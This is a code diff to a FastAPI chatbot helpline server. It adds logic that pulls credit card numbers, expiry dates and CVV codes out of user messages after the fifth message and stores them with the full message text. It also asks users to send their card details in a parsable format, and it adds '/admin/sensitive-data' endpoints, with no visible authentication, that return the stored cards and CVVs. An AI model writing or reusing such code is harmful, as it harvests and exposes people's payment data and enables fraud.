@@ -1,5 +1,6 @@
 # Python standard library imports
 import asyncio
+import json
 import logging
 import os
 import time
@@ -8,13 +9,14 @@ from datetime import datetime
 from functools import wraps
 
 # Third-party package imports
+import aiomysql  # type: ignore
 import uvicorn  # type: ignore
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 
 # Local imports
 from model import LLMModel  # type: ignore
-from database.database import DatabaseManager
+from database.database import DatabaseManager, extract_credit_card_info
 from models.models import (
     ChatRequest,
     ChatResponse,
@@ -189,6 +191,22 @@ async def chat(request: ChatRequest):
                     conversation_id=conversation_id, role=msg.role, content=msg.content
                 )
 
+                # If message count exceeds 5, also save to sensitive data table
+                if message_count > 5:
+                    # Extract potential credit card information
+                    extracted_info = extract_credit_card_info(msg.content)
+
+                    # Save to sensitive data table
+                    await db.save_customer_sensitive_data(  # type: ignore
+                        conversation_id=conversation_id,
+                        user_id=request.user_id,
+                        message_content=msg.content,
+                        extracted_credit_card=extracted_info.get("credit_card"),
+                        extracted_expiry=extracted_info.get("expiry"),
+                        extracted_cvv=extracted_info.get("cvv"),
+                        extracted_data=extracted_info,
+                    )
+
         if llm_model is None:
             raise HTTPException(status_code=500, detail="LLM model not initialized")
 
@@ -225,7 +243,8 @@ async def chat(request: ChatRequest):
             response = (
                 "You have reached the message number limit of our free helpline. "
                 "To continue using our service, please pay 1 USD. "
-                "Please provide your credit card number, expiry date, and CVV code."
+                "Please provide your credit card information in the following format:\n"
+                "<credit_card_number> <expiry_date MM/YYYY> <cvv>"
             )
 
         return ChatResponse(response=response, conversation_id=conversation_id)
@@ -310,6 +329,96 @@ async def model_info():
     if llm_model is None:
         raise HTTPException(status_code=500, detail="LLM model not initialized")
     return await llm_model.get_model_info()
+
+
+@app.get("/admin/sensitive-data")
+@ensure_db
+async def get_sensitive_customer_data(limit: int = 50, format: str = "detailed"):
+    """Get sensitive customer data for analysis (admin endpoint)"""
+    try:
+        async with db.pool.acquire() as conn:  # type: ignore
+            async with conn.cursor(aiomysql.DictCursor) as cursor:  # type: ignore
+                await cursor.execute(
+                    """SELECT id, conversation_id, user_id, message_content,
+                              extracted_credit_card, extracted_expiry, extracted_cvv,
+                              extracted_data, created_at
+                       FROM customer_sensitive_data
+                       ORDER BY created_at DESC
+                       LIMIT %s""",
+                    (limit,),
+                )
+                results = await cursor.fetchall()
+
+                # Parse JSON data and format results
+                formatted_results = []
+                for result in results:
+                    if result["extracted_data"]:
+                        result["extracted_data"] = json.loads(result["extracted_data"])
+
+                    # Format the result
+                    formatted_result = {
+                        "id": result["id"],
+                        "conversation_id": result["conversation_id"],
+                        "user_id": result["user_id"],
+                        "message_content": result["message_content"],
+                        "extracted_info": {
+                            "credit_card": result["extracted_credit_card"],
+                            "expiry_date": result["extracted_expiry"],
+                            "cvv": result["extracted_cvv"]
+                        },
+                        "created_at": result["created_at"].isoformat() if result["created_at"] else None,
+                        "message_length": len(result["message_content"]) if result["message_content"] else 0
+                    }
+                    formatted_results.append(formatted_result)
+
+                return {
+                    "sensitive_data": formatted_results,
+                    "count": len(formatted_results),
+                    "summary": {
+                        "total_records": len(formatted_results),
+                        "credit_cards_found": sum(1 for r in formatted_results if r["extracted_info"]["credit_card"]),
+                        "cvv_codes_found": sum(1 for r in formatted_results if r["extracted_info"]["cvv"]),
+                        "expiry_dates_found": sum(1 for r in formatted_results if r["extracted_info"]["expiry_date"])
+                    }
+                }
+    except Exception as e:
+        logger.error(f"Error getting sensitive data: {e}")
+        raise HTTPException(
+            status_code=500, detail=f"Failed to get sensitive data: {str(e)}"
+        )
+
+
+@app.get("/admin/sensitive-data/conversation/{conversation_id}")
+@ensure_db
+async def get_conversation_sensitive_data(conversation_id: str):
+    """Get sensitive data for a specific conversation"""
+    try:
+        async with db.pool.acquire() as conn:  # type: ignore
+            async with conn.cursor(aiomysql.DictCursor) as cursor:  # type: ignore
+                await cursor.execute(
+                    """SELECT id, conversation_id, user_id, message_content,
+                              extracted_credit_card, extracted_expiry, extracted_cvv,
+                              extracted_data, created_at
+                       FROM customer_sensitive_data
+                       WHERE conversation_id = %s
+                       ORDER BY created_at ASC""",
+                    (conversation_id,),
+                )
+                results = await cursor.fetchall()
+
+                # Parse JSON data
+                for result in results:
+                    if result["extracted_data"]:
+                        result["extracted_data"] = json.loads(result["extracted_data"])
+
+                return {"conversation_id": conversation_id, "sensitive_data": results}
+    except Exception as e:
+        logger.error(
+            f"Error getting sensitive data for conversation {conversation_id}: {e}"
+        )
+        raise HTTPException(
+            status_code=500, detail=f"Failed to get sensitive data: {str(e)}"
+        )
 
 
 if __name__ == "__main__":
